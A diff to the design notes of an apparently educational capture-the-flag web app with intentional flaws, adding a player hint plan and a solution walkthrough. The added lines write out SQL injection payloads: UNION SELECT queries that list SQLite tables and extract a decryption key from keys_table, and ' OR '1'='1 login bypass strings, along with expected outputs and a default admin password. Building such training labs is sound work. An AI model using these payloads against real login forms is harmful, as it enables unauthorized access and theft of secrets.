@@ -118,10 +118,40 @@ This app contains intentional vulnerabilities for educational purposes. Do not u
 5. Open secret_video.mp4 and find the next hint.
 
 
+# WHAT DO WE NEED TO GIVE THEM HINT 
+1. tell them in the previous flag or on the website, admin, password123, that there are four tables in the web app, users, keys_table, videos, comments. 
+2. tell tehm what encryption it is -- 
+
+
 
 SQL injection 
+### BEST TO INJECT TO GET A LIST OF TABLES FIRST -- be in the hint document 
 
-' UNION SELECT decryption_key, NULL, NULL FROM keys_table --
+1. ' UNION SELECT NULL, NULL, NULL, group_concat(name, char(124)) FROM sqlite_master WHERE type='table' --
+2. return "Flag: users|comments|videos|keys_table | Access /get_video?id=1"
+
+
+## when doing it properly as a hacker
+1. enter username as admin
+2. enter password as ' UNION SELECT (SELECT decryption_key FROM keys_table LIMIT 1), NULL, NULL, NULL -- 
+3. it will return you with the flag as key, and the location of the video 
+### how do they know the number of fields? BY TRYING, because the prompt will tell them. 
+1. If they did less than the fields, e.g.,
+' UNION SELECT (SELECT decryption_key FROM keys_table LIMIT 1), NULL, NULL --
+
+It will return " Error: SELECTs to the left and right of UNION do not have the same number of result columns", prompting them to reduce or increase the number of fields. 
+
+
+
+## if you did it without sql injection or incorrectly-- still as admin
+1. enter username as admin, or ' OR '1'='1
+2. enter password as password123, ' OR '1'='1
+3. it will return you a wrong flag, it will display: Flag: admin | Access /get_video?id=1 (location is still correct)
+
+## if you did it without admin 
+1. enter wrong username or wrong password, it will tell you "ACCESS DENIED: Insufficient clearance."
+
+
 
 Download and decrypt video 
 
